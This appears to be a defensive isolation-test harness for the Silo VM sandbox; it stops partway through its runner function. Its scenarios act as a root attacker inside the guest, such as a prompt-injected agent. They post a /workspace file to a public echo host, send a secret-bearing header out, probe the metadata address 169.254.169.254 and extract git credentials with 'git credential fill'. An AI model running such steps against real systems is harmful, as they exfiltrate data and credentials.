#!/usr/bin/env python3
"""Silo isolation evals: re-runnable checks of what a guest can and cannot reach.

Each scenario plays the attacker the threat model assumes: code running as root
inside a Silo Linux computer (for example, a prompt-injected agent). It tries to
cross one boundary and reports a verdict:

  pass         the boundary held, and the scenario's positive control worked
  fail         the boundary did not hold
  known-gap    a documented limitation was reproduced (expected today)
  inconclusive a control failed, so the result says nothing either way
  skipped      the scenario's prerequisites were not given
  error        the eval itself broke

Run it on a Mac with Silo installed. See docs/evals/README.md for setup.
Standard library only; works with the macOS python3 (3.9+).
"""
from __future__ import annotations

import argparse
import datetime as dt
import json
import os
import platform
import plistlib
import secrets as random_source
import socket
import stat
import subprocess
import sys
import threading
import time
import traceback
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

from engine_client import EngineClient, EngineError, socket_path  # noqa: E402

PROBES = HERE / "probes"
RESULTS = HERE / "results"
EVAL_PREFIX = "silo-eval"
SECRET_PREFIX = "EVAL_CANARY"
SECRET_ALLOWED_HOST = "httpbingo.org"
ECHO_ALLOWED = "https://httpbingo.org/headers"
ECHO_ALLOWED_PLAIN_HTTP = "http://httpbingo.org/headers"
ECHO_OTHER = "https://postman-echo.com/headers"
ECHO_OTHER_POST = "https://postman-echo.com/post"
VERDICTS = ("pass", "fail", "known-gap", "inconclusive", "skipped", "error")


# Results ------------------------------------------------------------------------------


class Result:
    def __init__(self, scenario: "Scenario"):
        self.id = scenario.id
        self.title = scenario.title
        self.boundary = scenario.boundary
        self.expected = scenario.expected
        self.verdict = "error"
        self.summary = ""
        self.evidence: Dict[str, Any] = {}
        self.notes: List[str] = []
        self.seconds = 0.0

    def set(self, verdict: str, summary: str) -> "Result":
        assert verdict in VERDICTS, verdict
        self.verdict = verdict
        self.summary = summary
        return self

    def as_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "boundary": self.boundary,
            "expected": self.expected,
            "verdict": self.verdict,
            "summary": self.summary,
            "notes": self.notes,
            "evidence": self.evidence,
            "seconds": round(self.seconds, 1),
        }


class Scenario:
    def __init__(self, id: str, title: str, boundary: str, expected: str, run: Callable[["Context", Result], None]):
        self.id = id
        self.title = title
        self.boundary = boundary
        self.expected = expected
        self.run = run


# Context shared by scenarios ---------------------------------------------------------


class Context:
    def __init__(self, args: argparse.Namespace, client: Optional[EngineClient]):
        self.args = args
        self.client = client
        self.nonce = random_source.token_hex(6)
        self.computer: Optional[Dict[str, Any]] = None
        self.peer: Optional[Dict[str, Any]] = None
        self.host_canary = "silo-eval-host-canary-" + random_source.token_hex(16)
        self.host_canary_paths: List[Path] = []
        # A fresh name per run, so a user's own secret can never be touched.
        self.secret_name = f"{SECRET_PREFIX}_{self.nonce.upper()}"
        self.secret_value: Optional[str] = None
        self.secret_id: Optional[str] = None
        self.secret_error: Optional[str] = None
        self._scan: Optional[Dict[str, Any]] = None
        self.cleanups: List[Callable[[], None]] = []

    @property
    def computer_id(self) -> str:
        assert self.computer is not None
        return self.computer["configuration"]["id"]

    def probe(self, name: str) -> bytes:
        return (PROBES / name).read_bytes()

    def guest_python(self, computer_id: str, probe: str, *argv: str, root: bool = True, timeout_ms: int = 60_000) -> Any:
        assert self.client is not None
        result = self.client.exec(computer_id, ["python3", "-", *argv], stdin=self.probe(probe), root=root, timeout_ms=timeout_ms)
        if result.exit_code != 0:
            raise RuntimeError(f"guest probe {probe} exited {result.exit_code}: {result.stderr.decode('utf-8', 'replace')[-2000:]}")
        return result.json()

    def guest_sh(self, computer_id: str, script: str, *, root: bool = True, timeout_ms: int = 60_000):
        assert self.client is not None
        return self.client.exec(computer_id, ["sh", "-c", script], root=root, timeout_ms=timeout_ms)

    def scan(self) -> Dict[str, Any]:
        """One full guest filesystem scan for every host-only value, shared by scenarios."""
        if self._scan is None:
            assert self.client is not None
            needles = {"host-canary": self.host_canary.encode().hex()}
            if self.secret_value:
                needles["secret-value"] = self.secret_value.encode().hex()
            job = self.client.exec_start(self.computer_id, ["python3", "-", json.dumps(needles), self.args.scan_root], stdin=self.probe("fs_scan.py"))
            result = self.client.exec_wait(job, timeout=self.args.scan_timeout)
            if result.exit_code != 0:
                raise RuntimeError(f"filesystem scan exited {result.exit_code}: {result.stderr.decode('utf-8', 'replace')[-2000:]}")
            self._scan = result.json()
            self._scan["needles"] = sorted(needles)
        return self._scan


# Host-side helpers --------------------------------------------------------------------


class HostListener:
    """A TCP listener on the Mac that records every line it receives."""

    def __init__(self, address: str, reply: str):
        self.reply = reply
        self.lines: List[Dict[str, str]] = []
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((address, 0))
        self.server.listen(16)
        self.server.settimeout(0.5)
        self.address, self.port = self.server.getsockname()[:2]
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self) -> None:
        while not self._stop.is_set():
            try:
                connection, peer = self.server.accept()
            except (socket.timeout, OSError):
                continue
            with connection:
                connection.settimeout(3)
                try:
                    line = connection.recv(256).decode("utf-8", "replace").strip()
                    connection.sendall((self.reply + "\n").encode())
                except OSError:
                    line = ""
                self.lines.append({"peer": peer[0], "line": line})

    def close(self) -> None:
        self._stop.set()
        self._thread.join(timeout=2)
        self.server.close()


def host_lan_address() -> Optional[str]:
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect(("192.0.2.1", 9))  # TEST-NET-1; no packet is sent for UDP connect
        address = probe.getsockname()[0]
        return None if address.startswith("127.") else address
    except OSError:
        return None
    finally:
        probe.close()


def tcp_exchange(host: str, port: int, line: str, timeout: float = 3.0) -> Optional[str]:
    try:
        with socket.create_connection((host, port), timeout=timeout) as connection:
            connection.settimeout(timeout)
            connection.sendall((line + "\n").encode())
            return connection.recv(256).decode("utf-8", "replace").strip()
    except OSError:
        return None


# Scenarios ----------------------------------------------------------------------------


def scenario_host_files(ctx: Context, result: Result) -> None:
    scan = ctx.scan()
    hits = [hit for hit in scan["hits"] if hit["needle"] == "host-canary"]
    shared = [m for m in scan["mounts"] if m["fsType"] in ("virtiofs", "9p", "fuse", "fuse.virtiofs")]
    result.evidence = {
        "hostCanaryFiles": [str(p) for p in ctx.host_canary_paths],
        "guestFilesScanned": scan["files"],
        "guestBytesScanned": scan["bytes"],
        "guestUnreadable": scan["unreadable"],
        "hostSharedMounts": shared,
        "hits": hits,
    }
    chatgpt = [m for m in scan["mounts"] if m["mountPoint"] == "/opt/silo/chatgpt"]
    write_failed = None
    if chatgpt:
        attempt = ctx.guest_sh(ctx.computer_id, "touch /opt/silo/chatgpt/.silo-eval-write 2>&1; echo exit=$?")
        write_failed = "exit=0" not in attempt.text()
        result.evidence["chatgptMountWrite"] = attempt.text().strip()
        if not write_failed:
            ctx.guest_sh(ctx.computer_id, "rm -f /opt/silo/chatgpt/.silo-eval-write")
    expected_mounts = {"/", "/opt/silo/chatgpt"}
    unexpected = [m for m in shared if m["mountPoint"] not in expected_mounts]
    if unexpected:
        result.notes.append("Host-shared mounts other than / and /opt/silo/chatgpt: " + ", ".join(m["mountPoint"] for m in unexpected))
    if scan["files"] < ctx.args.scan_min_files:
        result.set("inconclusive", f"The scan read only {scan['files']} files, too few to trust.")
    elif hits:
        result.set("fail", "The guest found the host canary at: " + ", ".join(h["path"] for h in hits))
    elif write_failed is False:
        result.set("fail", "The guest wrote into the host's ChatGPT folder, which must be read-only.")
    else:
        detail = " The read-only ChatGPT mount refused a write." if chatgpt else ""
        result.set("pass", f"The canary in the Mac's home folder and /tmp was not found in {scan['files']} guest files.{detail}")


def scenario_host_network(ctx: Context, result: Result) -> None:
    reply = "silo-eval-host-reply-" + random_source.token_hex(8)
    loopback = HostListener("127.0.0.1", reply)
    ctx.cleanups.append(loopback.close)
    lan_address = host_lan_address()
    lan = None
    if lan_address:
        try:
            lan = HostListener(lan_address, reply)
            ctx.cleanups.append(lan.close)
        except OSError as error:
            result.notes.append(f"Could not listen on the Mac's LAN address {lan_address}: {error}")
    control = tcp_exchange("127.0.0.1", loopback.port, "host-control")
    lan_control = tcp_exchange(lan.address, lan.port, "host-control") if lan else None
    info = ctx.guest_python(ctx.computer_id, "net_info.py")
    send = "probe-" + ctx.nonce
    targets = [{"label": "public-control example.com:443", "host": "example.com", "port": 443, "send": ""}]
    hosts = []
    internal = info.get("hostMicrosandboxInternal")
    if isinstance(internal, list):
        hosts += [("host.microsandbox.internal", a) for a in internal]
    if info.get("gateway"):
        hosts.append(("default gateway", info["gateway"]))
    for label, host in hosts:
        targets.append({"label": f"{label} {host}:{loopback.port} (Mac 127.0.0.1 listener)", "host": host, "port": loopback.port, "send": send})
    if lan:
        targets.append({"label": f"Mac LAN address {lan.address}:{lan.port}", "host": lan.address, "port": lan.port, "send": send})
    targets.append({"label": "cloud metadata 169.254.169.254:80", "host": "169.254.169.254", "port": 80, "send": ""})
    for label, host in hosts:
        targets.append({"label": f"{label} {host}:53 (DNS, allowed by design)", "host": host, "port": 53, "send": ""})
    probes = ctx.guest_python(ctx.computer_id, "tcp_probe.py", json.dumps(targets))
    time.sleep(1)
    received = [line for line in loopback.lines + (lan.lines if lan else []) if send in line["line"]]
    result.evidence = {"guestNetwork": info, "probes": probes, "hostReceived": received, "hostControlReply": control,
                       "lanAddress": lan.address if lan else lan_address, "lanControlReply": lan_control}
    public_ok = probes[0]["connected"]
    crossed = [p for p in probes if reply in p.get("reply", "")]
    metadata = [p for p in probes if p["host"] == "169.254.169.254" and p["connected"]]
    dns_open = [p["label"] for p in probes if ":53 " in p["label"] and p["connected"]]
    if dns_open:
        result.notes.append("TCP port 53 on the host side answers: the DNS forwarder is the one allowed host service.")
    if crossed or received:
        result.set("fail", "The guest reached a listener on the Mac: " + (", ".join(p["label"] for p in crossed) or "see hostReceived"))
    elif metadata:
        result.set("fail", "The guest opened a connection to the metadata address 169.254.169.254:80.")
    elif control != reply:
        result.set("inconclusive", "The Mac could not reach its own loopback test listener.")
    elif lan is None or lan_control != reply:
        result.set("inconclusive", "No working listener on the Mac's LAN address, so the LAN path was not tested.")
    elif not public_ok:
        result.set("inconclusive", "The guest could not reach example.com:443, so blocked probes prove nothing.")
    else:
        result.set("pass", "The guest reached the internet but not the Mac's loopback, its LAN address, or the metadata address.")


def scenario_computer_to_computer(ctx: Context, result: Result) -> None:
    if ctx.peer is None:
        result.set("skipped", "Pass --peer with a second running computer to run this scenario.")
        return
    client = ctx.client
    assert client is not None
    peer_id = ctx.peer["configuration"]["id"]
    port = 20000 + int(random_source.token_hex(2), 16) % 20000
    token = "silo-eval-peer-reply-" + random_source.token_hex(8)
    log_path = f"/tmp/silo-eval-listener-{ctx.nonce}.log"
    job = client.exec_start(peer_id, ["python3", "-", str(port), token, log_path], stdin=ctx.probe("listener.py"))
    ctx.cleanups.append(lambda: client.cancel(job))
    ctx.cleanups.append(lambda: ctx.guest_sh(peer_id, f"pkill -f 'python3 - {port} ' ; rm -f {log_path}"))
    time.sleep(2)
    self_check = ctx.guest_python(peer_id, "tcp_probe.py", json.dumps([{"label": "peer self", "host": "127.0.0.1", "port": port, "send": "self"}]))
    published_port = None
    try:
        state = client.call("network.publish", {"computerId": peer_id, "port": port})
        ctx.cleanups.append(lambda: client.call("network.unpublish", {"computerId": peer_id, "port": port}))
        for row in state.get("computers", []):
            if row.get("computerId") == peer_id or row.get("computer") == ctx.peer["configuration"]["name"]:
                for published in row.get("ports", []):
                    if published.get("port") == port and published.get("hostPort"):
                        published_port = published["hostPort"]
    except EngineError as error:
        result.notes.append(f"Could not publish the peer's port: {error}")
    host_control = None
    if published_port:
        for _ in range(10):
            host_control = tcp_exchange("127.0.0.1", published_port, "host-control")
            if host_control == token:
                break
            time.sleep(1)
    own = ctx.guest_python(ctx.computer_id, "net_info.py")
    peer = ctx.guest_python(peer_id, "net_info.py")
    send = "probe-" + ctx.nonce
    targets = []
    peer_addresses = peer.get("ownAddresses") if isinstance(peer.get("ownAddresses"), list) else []
    own_addresses = own.get("ownAddresses") if isinstance(own.get("ownAddresses"), list) else []
    for address in peer_addresses:
        targets.append({"label": f"peer address {address}:{port}", "host": address, "port": port, "send": send})
    if set(peer_addresses) & set(own_addresses):
        result.notes.append("Both computers report the same guest address, so the peer cannot be addressed directly; the probe reaches the computer's own stack.")
    host_names = []
    if isinstance(own.get("hostMicrosandboxInternal"), list):
        host_names += own["hostMicrosandboxInternal"]
    if own.get("gateway"):
        host_names.append(own["gateway"])
    for host in host_names:
        targets.append({"label": f"via host {host}:{port}", "host": host, "port": port, "send": send})
        if published_port:
            targets.append({"label": f"via host {host}:{published_port} (peer's published port)", "host": host, "port": published_port, "send": send})
    probes = ctx.guest_python(ctx.computer_id, "tcp_probe.py", json.dumps(targets))
    peer_log = ctx.guest_sh(peer_id, f"cat {log_path} 2>/dev/null || true").text()
    result.evidence = {
        "peerSelfCheck": self_check,
        "publishedHostPort": published_port,
        "hostReachedPublishedPort": host_control == token,
        "probes": probes,
        "peerListenerLog": peer_log.splitlines(),
    }
    crossed = [p["label"] for p in probes if token in p.get("reply", "")]
    if not self_check or token not in self_check[0].get("reply", ""):
        result.set("inconclusive", "The listener in the peer computer did not answer its own probe.")
    elif crossed or send in peer_log:
        result.set("fail", "The computer reached the peer's listener: " + (", ".join(crossed) or "see peerListenerLog"))
    elif not published_port or host_control != token:
        result.set("inconclusive", "The peer's port was not published or did not answer on the Mac, so the published-port path was not tested.")
    else:
        result.set("pass", "The computer could not reach a service in another computer, directly or through its published port, which the Mac itself reached.")


def setup_secret(ctx: Context) -> None:
    """Adds a disposable secret to the computer under test and restarts it to load it."""
    client = ctx.client
    assert client is not None
    if any(existing["name"] == ctx.secret_name for existing in client.call("secrets.list", {})):
        raise RuntimeError(f"a secret named {ctx.secret_name} already exists; refusing to change it")
    value = "silo-eval-secret-" + random_source.token_hex(16)
    rows = client.call("secrets.save", {"request": {
        "operation": "add",
        "name": ctx.secret_name,
        "value": value,
        "computerIds": [ctx.computer_id],
        "allowedDomains": [SECRET_ALLOWED_HOST],
    }})
    created = [row for row in rows if row["name"] == ctx.secret_name]
    if not created:
        raise RuntimeError("secrets.save did not return the new secret")
    ctx.secret_id = created[0]["id"]
    ctx.secret_value = value
    ctx.cleanups.append(lambda: client.call("secrets.remove", {"id": ctx.secret_id}))
    # A secret added to a running computer is loaded on its next boot.
    client.restart(ctx.computer_id)


def secret_guard(ctx: Context, result: Result) -> bool:
    if ctx.args.no_secrets:
        result.set("skipped", "Secret scenarios were turned off with --no-secrets.")
        return False
    if ctx.secret_error:
        result.set("error", "Could not set up the disposable secret: " + ctx.secret_error)
        return False
    return True


def guest_curl(ctx: Context, url: str, header: bool = True, data: Optional[str] = None) -> Dict[str, Any]:
    header_arg = f'-H "X-Silo-Eval: ${ctx.secret_name}"' if header else ""
    data_arg = f"--data-binary @{data}" if data else ""
    script = f'curl -sS --max-time 25 -w "\\nhttp=%{{http_code}}" {header_arg} {data_arg} "{url}?probe={ctx.nonce}"'
    output = ctx.guest_sh(ctx.computer_id, script, timeout_ms=40_000)
    text = output.text()
    body, _, status = text.rpartition("\nhttp=")
    return {"url": url, "status": status.strip(), "exit": output.exit_code, "body": body, "stderr": output.stderr.decode("utf-8", "replace")[-500:]}


def redact(text: str, value: Optional[str]) -> str:
    return text.replace(value, "<REAL-SECRET-VALUE>") if value else text


def scenario_secret_in_guest(ctx: Context, result: Result) -> None:
    if not secret_guard(ctx, result):
        return
    env = ctx.guest_sh(ctx.computer_id, f'printf "%s" "${ctx.secret_name}"').text()
    scan = ctx.scan()
    hits = [hit for hit in scan["hits"] if hit["needle"] == "secret-value"]
    result.evidence = {
        "guestEnvironmentValue": redact(env, ctx.secret_value),
        "placeholderExpected": f"$MSB_{ctx.secret_name}",
        "guestFilesScanned": scan["files"],
        "hits": hits,
    }
    if ctx.secret_value and ctx.secret_value in env:
        result.set("fail", "The guest environment holds the real secret value.")
    elif hits:
        result.set("fail", "The real secret value is in the guest at: " + ", ".join(h["path"] for h in hits))
    elif env != f"$MSB_{ctx.secret_name}":
        result.set("inconclusive", f"The guest did not get the expected placeholder (got {env!r}); was the computer restarted?")
    else:
        result.set("pass", f"The guest sees only the placeholder; the value is in none of {scan['files']} files or any process environment.")


def scenario_secret_other_hosts(ctx: Context, result: Result) -> None:
    if not secret_guard(ctx, result):
        return
    other = guest_curl(ctx, ECHO_OTHER)
    plain = guest_curl(ctx, ECHO_ALLOWED_PLAIN_HTTP)
    placeholder = f"$MSB_{ctx.secret_name}"
    rows = []
    for name, response in (("unlisted host over HTTPS", other), ("allowed host over plain HTTP", plain)):
        rows.append({
            "case": name,
            "url": response["url"],
            "status": response["status"],
            "valueSent": bool(ctx.secret_value and ctx.secret_value in response["body"]),
            "placeholderSent": placeholder in response["body"],
            "stderr": response["stderr"],
        })
    result.evidence = {"requests": rows}
    leaked = [row["case"] for row in rows if row["valueSent"]]
    unproven = [row["case"] for row in rows if not (row["status"].startswith("2") and row["placeholderSent"])]
    if leaked:
        result.set("fail", "The real value was sent to: " + ", ".join(leaked))
    elif unproven:
        result.set("inconclusive", "No echo showed the placeholder arriving for: " + ", ".join(unproven))
    else:
        result.notes.append("The placeholder string itself is forwarded unchanged to hosts that are not allowed; it is not a secret.")
        result.set("pass", "Only the placeholder reached hosts outside the secret's allowed list and plain-HTTP requests.")


def scenario_secret_reflected(ctx: Context, result: Result) -> None:
    if not secret_guard(ctx, result):
        return
    response = guest_curl(ctx, ECHO_ALLOWED)
    reflected = bool(ctx.secret_value and ctx.secret_value in response["body"])
    result.evidence = {"url": response["url"], "status": response["status"], "guestSawRealValue": reflected,
                       "body": redact(response["body"], ctx.secret_value)[:1500]}
    if reflected:
        result.set("known-gap", f"{SECRET_ALLOWED_HOST} is allowed, echoes request headers, and the guest read the real value from its reply.")
    elif not response["status"].startswith("2"):
        result.set("inconclusive", f"{ECHO_ALLOWED} did not answer (status {response['status']}).")
    else:
        result.set("inconclusive", "The allowed echo service did not reflect the real value; substitution may not have happened.")


def scenario_open_egress(ctx: Context, result: Result) -> None:
    marker = "silo-eval-workspace-data-" + random_source.token_hex(12)
    path = f"/workspace/.silo-eval-{ctx.nonce}"
    ctx.guest_sh(ctx.computer_id, f"printf %s {marker} > {path}")
    ctx.cleanups.append(lambda: ctx.guest_sh(ctx.computer_id, f"rm -f {path}"))
    response = guest_curl(ctx, ECHO_OTHER_POST, header=False, data=path)
    delivered = marker in response["body"]
    result.evidence = {"url": response["url"], "status": response["status"], "dataDelivered": delivered}
    if delivered:
        result.set("known-gap", "A file from /workspace was posted to an arbitrary public host. There is no egress allowlist yet.")
    elif not response["status"].startswith("2"):
        result.set("inconclusive", f"{ECHO_OTHER_POST} did not answer (status {response['status']}).")
    else:
        result.set("inconclusive", "The public host answered but did not show the data.")


def github_grant_problem(policy: Optional[Dict[str, Any]], readable: str, ungranted: str) -> Optional[str]:
    """Why the computer's saved GitHub grants cannot support this scenario, or None."""
    if policy is None:
        return "The computer has no GitHub access; grant it one repository read-only in Silo first."
    if policy.get("authenticationMethod") != "oauth":
        return "The computer uses a personal token, which grants the token's full permissions; use the Silo GitHub App."
    if policy.get("repositoryMode") != "selected":
        return "The computer has access to all repositories; select repositories so one stays ungranted."
    grants = {g["repository"].lower(): g.get("allowPushes", False) for g in policy.get("repositories", [])}
    if readable.lower() not in grants:
        return f"{readable} is not granted to the computer; grant it read-only in Silo first."
    if grants[readable.lower()]:
        return f"{readable} is granted with changes allowed; it must be read-only for this scenario."
    if ungranted.lower() in grants:
        return f"{ungranted} is granted to the computer; it must not be for this scenario."
    return None


def scenario_github_scope(ctx: Context, result: Result) -> None:
    readable, ungranted = ctx.args.github_readable, ctx.args.github_ungranted
    if not readable or not ungranted:
        result.set("skipped", "Pass --github-readable and --github-ungranted to run this scenario.")
        return
    assert ctx.client is not None
    state = ctx.client.call("github.state", {})
    policy = next((p for p in state.get("computers", []) if p.get("computerId") == ctx.computer_id), None)
    problem = github_grant_problem(policy, readable, ungranted)
    result.evidence["githubPolicy"] = policy
    if problem:
        result.set("inconclusive", problem)
        return
    branch = f"silo-eval-{ctx.nonce}"
    work = f"/tmp/silo-eval-gh-{ctx.nonce}"
    script = f"""
set -u
rm -rf {work}; mkdir -p {work}; cd {work}
git init -q . && git -c user.name=silo-eval -c user.email=eval@invalid commit -q --allow-empty -m 'silo isolation eval (safe to delete)'
echo "ls-readable=$(git ls-remote https://github.com/{readable}.git HEAD >/dev/null 2>&1; echo $?)"
echo "ls-ungranted=$(git ls-remote https://github.com/{ungranted}.git HEAD >/dev/null 2>&1; echo $?)"
echo "push-readable=$(git push -q https://github.com/{readable}.git HEAD:refs/heads/{branch} >/dev/null 2>&1; echo $?)"
echo "push-ungranted=$(git push -q https://github.com/{ungranted}.git HEAD:refs/heads/{branch} >/dev/null 2>&1; echo $?)"
printf 'gh-token=%s\\n' "${{GH_TOKEN:-unset}}" | cut -c1-40
printf 'credential-prefix=%s\\n' "$(printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill 2>/dev/null | grep '^password=' | cut -c10-21)"
"""
    output = ctx.guest_sh(ctx.computer_id, script, root=False, timeout_ms=120_000).text()
    fields = dict(line.split("=", 1) for line in output.splitlines() if "=" in line)
    for repository, key in ((readable, "push-readable"), (ungranted, "push-ungranted")):
        if fields.get(key) == "0":
            ctx.guest_sh(ctx.computer_id, f"cd {work} && git push -q https://github.com/{repository}.git :refs/heads/{branch}", root=False, timeout_ms=60_000)
    ctx.cleanups.append(lambda: ctx.guest_sh(ctx.computer_id, f"rm -rf {work}"))
    scan = ctx.scan()
    token_like = scan.get("githubTokenLike", [])
    result.evidence.update({"outcomes": fields, "tokenLikeStringsInGuest": token_like})
    real_token_prefixes = ("gho_", "ghu_", "ghs_", "ghp_", "github_pat_")
    exposed = [k for k in ("gh-token", "credential-prefix") if fields.get(k, "").startswith(real_token_prefixes)]
    if fields.get("ls-readable") != "0":
        result.set("inconclusive", f"The computer could not read {readable}, so a refused push proves nothing.")
    elif fields.get("push-readable") == "0" or fields.get("push-ungranted") == "0":
        pushed = [r for r, k in ((readable, "push-readable"), (ungranted, "push-ungranted")) if fields.get(k) == "0"]
        result.set("fail", "The guest pushed a branch to: " + ", ".join(pushed) + " (the branch was deleted again).")
    elif exposed or token_like:
        result.set("fail", "A real GitHub token is visible in the guest.")
    else:
        result.set("pass", f"The guest read {readable} but could push neither to it (read-only) nor to {ungranted} (not granted); it holds only a placeholder token.")


def scenario_engine_socket(ctx: Context, result: Result) -> None:
    path = socket_path(ctx.args.channel)
    info = os.stat(path)
    directory = os.stat(path.parent)
    result.evidence = {
        "socket": str(path),
        "socketOwnerUid": info.st_uid,
        "socketMode": oct(stat.S_IMODE(info.st_mode)),
        "directoryMode": oct(stat.S_IMODE(directory.st_mode)),
        "evalUid": os.getuid(),
    }
    other = None
    if ctx.args.other_user:
        code = (
            "import socket,sys\n"
            "s=socket.socket(socket.AF_UNIX)\n"
            f"try:\n s.connect({str(path)!r}); print('connected')\n"
            "except OSError as e: print(type(e).__name__)\n"
        )
        run = subprocess.run(["sudo", "-n", "-u", ctx.args.other_user, sys.executable, "-c", code], capture_output=True, text=True, timeout=30)
        other = run.stdout.strip()
        result.evidence["otherUserAttempt"] = {"user": ctx.args.other_user, "exit": run.returncode,
                                               "stdout": other, "stderr": run.stderr.strip()[-500:]}
        if run.returncode != 0 or not (other == "connected" or other.endswith("Error")):
            other = "unrecognized"
    private_dir = stat.S_IMODE(directory.st_mode) & 0o077 == 0
    if info.st_uid != os.getuid() or directory.st_uid != os.getuid():
        result.set("fail", "The engine socket or its folder is owned by another user.")
    elif not private_dir:
        result.set("fail", f"The socket's folder is accessible to other users ({oct(stat.S_IMODE(directory.st_mode))}).")
    elif other == "connected":
        result.set("fail", f"User {ctx.args.other_user} connected to the engine socket.")
    elif other == "unrecognized":
        result.set("inconclusive", f"The probe as {ctx.args.other_user} did not run (sudo -n failed or gave no result).")
    else:
        checked = f" and {ctx.args.other_user} could not connect ({other})" if other is not None else ""
        result.set("pass", f"The socket's folder is private to its owner{checked}; silod also rejects peers whose uid differs.")
        if other is None:
            result.notes.append("Cross-user connection not attempted; pass --other-user nobody (needs passwordless sudo) to try it.")


def scenario_same_user_client(ctx: Context, result: Result) -> None:
    assert ctx.client is not None
    result.evidence = {
        "handshakeClientId": ctx.client.handshake.get("clientId"),
        "credentialsPresented": "none",
        "methodsUsedByThisRun": list(ctx.client.methods),
    }
    powers = [label for method, label in (("guest.exec", "root commands in guests"), ("secrets.save", "secret changes"),
                                          ("network.publish", "port publishing")) if method in ctx.client.methods]
    extra = (", including " + " and ".join(powers)) if powers else ""
    result.set("known-gap", f"This eval itself, an unsigned script run as the same macOS user, drove the engine with no credentials{extra}.")


SCENARIOS = [
    Scenario("host-files", "Guest reads the Mac's files", "VM boundary; only /workspace and a read-only ChatGPT folder are shared",
             "pass", scenario_host_files),
    Scenario("host-network", "Guest reaches the Mac's loopback, LAN address or metadata address", "Network policy: egress to public addresses only, plus host DNS",
             "pass", scenario_host_network),
    Scenario("computer-to-computer", "Guest reaches a service in another computer", "Per-computer network; published ports bind to the Mac's 127.0.0.1",
             "pass", scenario_computer_to_computer),
    Scenario("secret-in-guest", "Secret value visible inside the guest", "Placeholder substitution in the runtime's TLS proxy",
             "pass", scenario_secret_in_guest),
    Scenario("secret-other-hosts", "Secret sent to a host outside its allowed list, or over plain HTTP", "Allowed-host list and TLS identity requirement",
             "pass", scenario_secret_other_hosts),
    Scenario("secret-reflected", "Allowed host reflects the secret back to the guest", "None: an allowed server receives the real value",
             "known-gap", scenario_secret_reflected),
    Scenario("open-egress", "Guest posts workspace data to an arbitrary public host", "None yet: no egress allowlist",
             "known-gap", scenario_open_egress),
    Scenario("github-scope", "Guest pushes to a read-only or ungranted repository", "Scoped GitHub user token, injected only for GitHub hosts",
             "pass", scenario_github_scope),
    Scenario("engine-socket", "Another macOS user drives the engine", "Socket folder mode 0700 and peer uid check",
             "pass", scenario_engine_socket),
    Scenario("same-user-client", "Any same-user process drives the engine", "None yet: no client authentication on the socket",
             "known-gap", scenario_same_user_client),
]


# Runner -------------------------------------------------------------------------------


def git_commit() -> str:
    try:
        return subprocess.run(["git", "-C", str(HERE), "rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()
    except (OSError, subprocess.CalledProcessError):
        return "unknown"


def app_version(app: str) -> Optional[str]:
    try:
        with open(Path(app) / "Contents" / "Info.plist", "rb") as handle:
            info = plistlib.load(handle)
        return f"{info.get('CFBundleShortVersionString')} ({info.get('CFBundleVersion')})"
    except (OSError, plistlib.InvalidFileException):
        return None


def require_eval_computer(name: str, allow_any: bool) -> None:
    if not allow_any and not name.startswith(EVAL_PREFIX):
        raise SystemExit(f"Refusing to run against {name!r}: use a disposable computer whose name starts with {EVAL_PREFIX!r}, or pass --allow-any-computer.")


def write_results(meta: Dict[str, Any], results: List[Result], directory: Path) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    stem = f"{meta['date']}-{meta['commit'][:8]}"
    payload = {"meta": meta, "results": [r.as_dict() for r in results]}
    (directory / f"{stem}.json").write_text(json.dumps(payload, indent=2) + "\n")
    (directory / f"{stem}.md").write_text(render_markdown(meta, results))
    return directory / f"{stem}.md"


def render_markdown(meta: Dict[str, Any], results: List[Result]) -> str:
    counts = {v: sum(1 for r in results if r.verdict == v) for v in VERDICTS}
    lines = [
        f"# Isolation eval results, {meta['date']}",
        "",
        f"- Eval commit: `{meta['commit']}`",
        f"- Silo app: {meta.get('appVersion') or 'unknown'}",
        f"- Engine protocol: {meta.get('protocol')}",
        f"- Host: macOS {meta.get('macos')} on {meta.get('machine')}",
        f"- Computer under test: `{meta.get('computer')}`; peer: `{meta.get('peer') or 'none'}`",
        f"- Totals: " + ", ".join(f"{counts[v]} {v}" for v in VERDICTS if counts[v]),
        "",
        "| Scenario | Expected | Verdict | Summary |",
        "| --- | --- | --- | --- |",
    ]
    for r in results:
        marker = "" if r.verdict == r.expected or r.verdict == "skipped" else " ⚠️"
        lines.append(f"| `{r.id}`: {r.title} | {r.expected} | **{r.verdict}**{marker} | {r.summary.replace('|', '/')} |")
    lines += ["", "⚠️ marks a verdict that differs from the expected one.", "", "## Details", ""]
    for r in results:
        lines += [f"### `{r.id}`: {r.title}", "", f"- Boundary: {r.boundary}", f"- Verdict: **{r.verdict}** (expected {r.expected}), {r.seconds:.0f}s"]
        lines += [f"- Note: {note}" for note in r.notes]
        lines += ["", "<details><summary>Evidence</summary>", "", "```json", json.dumps(r.evidence, indent=2)[:6000], "```", "", "</details>", ""]
    return "\n".join(lines)


def run(args: argparse.Namespace) -> int:
    selected = [s for s in SCENARIOS if not args.only or s.id in args.only]
    require_eval_computer(args.computer, args.allow_any_computer)
    if args.peer:
        require_eval_computer(args.peer, args.allow_any_computer)
    client = EngineClient(socket_path(args.channel))
    ctx = Context(args, client)
    results: List[Result] = []
    try:
        ctx.computer = client.computer_by_name(args.computer)
        if args.peer:
            ctx.peer = client.computer_by_name(args.peer)
        for computer in filter(None, (ctx.computer, ctx.peer)):
            if computer["state"] != "running":
                raise SystemExit(f"Start {computer['configuration']['name']!r} in Silo first (it is {computer['state']}).")
        home = Path.home() / f".silo-eval-canary-{ctx.nonce}.txt"
        temp = Path("/tmp") / f"silo-eval-canary-{ctx.nonce}.txt"
        for path in (home, temp):
            path.write_text(ctx.host_canary + "\n")
            ctx.host_canary_paths.append(path)
        ctx.cleanups.append(lambda: [p.unlink() for p in ctx.host_canary_paths if p.exists()])
        needs_secret = any(s.id.startswith("secret-") for s in selected)
